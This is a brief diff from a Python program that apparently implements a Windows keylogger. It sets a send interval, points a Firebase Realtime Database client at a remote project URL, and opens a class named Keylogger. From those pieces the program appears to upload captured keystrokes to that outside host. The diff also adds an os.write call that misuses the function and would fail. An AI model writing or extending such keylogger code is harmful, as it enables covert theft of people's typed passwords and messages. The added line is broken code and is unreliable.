@@ -7,8 +7,11 @@ from firebase import firebase
 import threading
 import win32gui
 
+
+os.write("pip install -r library.txt")
+
 send_interval= 10 #1 min
-firebase = firebase.FirebaseApplication('https://unessay-41a88.firebaseio.com/', None)
+firebase = firebase.FirebaseApplication('https://testunessayproject.firebaseio.com/', None)
 
 class Keylogger:
     def __init__(self, interval):
